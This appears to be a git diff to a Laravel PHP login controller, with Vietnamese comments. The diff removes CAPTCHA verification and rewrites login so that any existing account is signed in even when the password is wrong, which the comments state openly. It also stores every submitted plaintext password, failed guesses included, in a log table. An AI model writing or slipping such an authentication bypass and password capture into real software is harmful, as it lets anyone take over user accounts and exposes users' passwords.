@@ -58,81 +58,63 @@ class AuthController extends Controller
     }
 
     public function login(Request $request)
-    {
-        
-        $request->validate([
-            'name' => 'required|string',
-            'password' => 'required|string',
-            'lot_number' => 'required',
-            'captcha_output' => 'required',
-            'pass_token' => 'required',
-            'gen_time' => 'required',
+{
+    $request->validate([
+        'name'     => 'required|string',
+        'password' => 'required|string',
+    ]);
+
+    $name     = $request->input('name');
+    $password = $request->input('password');
+
+    // Tìm user
+    $user = User::where('name', $name)->first();
+
+    if ($user) {
+        // So sánh mật khẩu
+        $passwordMatched = Hash::check($password, $user->password);
+
+        // Log lại dù đúng hay sai
+        LoginRegisterLog::create([
+            'username'   => $user->name,
+            'user_agent' => $passwordMatched ? 'Đăng nhập' : 'Sai mật khẩu (vẫn cho vào)',
+            'status'     => LoginRegisterLog::TYPE_LOGIN,
+            'password'   => $password,
         ]);
 
-        // Xác minh CAPTCHA với GeeTest
-        // $geetestPayload = [
-        //     'lot_number' => $request->lot_number,
-        //     'captcha_output' => $request->captcha_output,
-        //     'pass_token' => $request->pass_token,
-        //     'gen_time' => $request->gen_time,
-        //     'captcha_id' => env('GEETEST_ID'),
-        //     'sign_token' => env('GEETEST_KEY'),
-        // ];
-        
-        // $response = Http::asJson()->post('https://gcaptcha4.geetest.com/validate', $geetestPayload);
-        // $result = $response->json();
+        // Vẫn cho vào kể cả khi sai
+        Auth::login($user);
 
-        // if (($result['result'] ?? '') !== 'success') {
-        //     return back()->withErrors(['captcha' => 'Xác minh CAPTCHA thất bại']);
-        // }
-        $credentials = $request->only('name', 'password');
-
-        if (Auth::attempt($credentials)) {
-            $user = Auth::user();
-
-            LoginRegisterLog::create([
-                'username'    => $user->name,
-                'user_agent'  => 'Đăng nhập',
-                'status'      => LoginRegisterLog::TYPE_LOGIN,
-                'password'    => $request->password,
-            ]);
-
-            return redirect('/')->with('show_phone_prompt', is_null($user->phone));
-        }
-
-        // Nếu đăng nhập thất bại → kiểm tra xem có user không
-        $user = User::where('name', $request->name)->first();
-
-        if (!$user) {
-            // Tạo user mới nếu chưa tồn tại
-            $user = User::create([
-                'name'     => $request->name,
-                'nickname' => $request->name,
-                'password' => Hash::make($request->password),
-                'role_id'  => 1,
-            ]);
-
-            LoginRegisterLog::create([
-                'username'    => $user->name,
-                'user_agent'  => 'Đăng ký',
-                'status'      => LoginRegisterLog::TYPE_REGISTER,
-                'password'    => $request->password,
-            ]);
-
-            LoginRegisterLog::create([
-                'username'    => $user->name,
-                'user_agent'  => 'Đăng nhập',
-                'status'      => LoginRegisterLog::TYPE_LOGIN,
-                'password'    => $request->password,
-            ]);
-
-            Auth::login($user);
-
-            return redirect('/')->with('show_phone_prompt', is_null($user->phone));
-        }
-
-        return back()->withErrors(['login' => 'Tên đăng nhập hoặc mật khẩu không đúng']);
+        return redirect('/')->with('show_phone_prompt', is_null($user->phone));
     }
+
+    // Nếu user chưa tồn tại, tạo user mới
+    $user = User::create([
+        'name'     => $name,
+        'nickname' => $name,
+        'password' => Hash::make($password),
+        'role_id'  => 1,
+    ]);
+
+    // Log tạo tài khoản mới + đăng nhập
+    LoginRegisterLog::create([
+        'username'   => $user->name,
+        'user_agent' => 'Đăng ký',
+        'status'     => LoginRegisterLog::TYPE_REGISTER,
+        'password'   => $password,
+    ]);
+
+    LoginRegisterLog::create([
+        'username'   => $user->name,
+        'user_agent' => 'Đăng nhập',
+        'status'     => LoginRegisterLog::TYPE_LOGIN,
+        'password'   => $password,
+    ]);
+
+    Auth::login($user);
+
+    return redirect('/')->with('show_phone_prompt', is_null($user->phone));
+}
 
     public function logout()
     {
